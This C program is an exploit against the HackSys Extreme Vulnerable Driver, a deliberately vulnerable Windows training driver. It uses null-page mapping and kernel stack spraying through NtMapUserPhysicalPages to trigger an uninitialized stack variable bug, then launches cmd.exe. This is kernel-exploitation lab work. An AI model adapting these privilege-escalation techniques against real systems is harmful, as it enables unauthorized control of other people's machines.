#include "Includes.h"

int main(int argc, char** argv)
{
	printf("[>] Exploit written by uncodable (7/24/2021)\n[>] Exploit -> HackSys Extreme Vulnerable Driver, Kernel Uninitialized Stack-based Variable Memory Corruption (x64)\n[>] Let's exploit!\n");

	if (check())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (setup())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (exploit())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	printf("[+] Exploit completed successfully!");
	unused = getchar();

	return 0;
}

int check()
{
	driver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == (HANDLE)-1)
	{
		printf("[-] Failed to obtain a handle. Handle value: 0x%p, Error: %d (0x%x)", driver, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a handle. Handle value: 0x%p\n", driver);

	return 0;
}

int setup()
{
	ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!ntdll)
	{
		printf("[-] Failed to load ntdll.dll. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Loaded ntdll.dll. Handle value: 0x%p\n", ntdll);

	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	if (!_ZwAllocateVirtualMemory)
	{
		printf("[-] Failed to locate ZwAllocateVirtualMemory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Located ZwAllocateVirtualMemory. Address: 0x%p\n", _ZwAllocateVirtualMemory);

	PVOID baseAddress = (PVOID)1;
	SIZE_T regionSize = (SIZE_T)4096;
	NTSTATUS status = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status)
	{
		printf("[-] Failed to allocate null page. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 1;
	}
	printf("[+] Allocated null page. NTSTATUS: %d (0x%x)\n", status, status);

	memcpy((unsigned long long*)0x0000000000000100, &breakpoints, 8);
	printf("[+] Mapped shellcode onto the null page.\n");

	return 0;
}

int exploit()
{
	memset(&inBuffer, 'A', 8);

	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(ntdll, "NtMapUserPhysicalPages");
	if (!NtMapUserPhysicalPages)
	{
		printf("[-] Failed to locate NtMapUserPhysicalPages. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Located NtMapUserPhysicalPages. Address: 0x%p\n", NtMapUserPhysicalPages);

	// Credits: h0mbre (https://h0mbre.github.io/HEVD_UninitializedStackPointer_32bit/#)
	char pfns[4096] = { 0 };
	for (unsigned long long i = 0; i < 512; i++)
	{
		memcpy((pfns + (i * 8)), (unsigned long long*)0x0000000000000100, 8);
	}

	printf("[+] Forcing the usage of the uninitialized stack variable...\n");
	Sleep(100);

	int baseAddress = 0;
	NTSTATUS status = NtMapUserPhysicalPages(&baseAddress, 512, (PBYTE)&pfns);
	if (status != 0xC00000EF)
	{
		printf("[-] Failed to spray the kernel stack. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 1;
	}
	DeviceIoControl(driver, 0x22202F, &inBuffer, 8, &outBuffer, 1024, &bytesReturned, 0);
	system("start C:\\Windows\\System32\\cmd.exe");

	CloseHandle(driver);
	CloseHandle(ntdll);
	printf("[+] Cleaned up.\n");

	return 0;
}
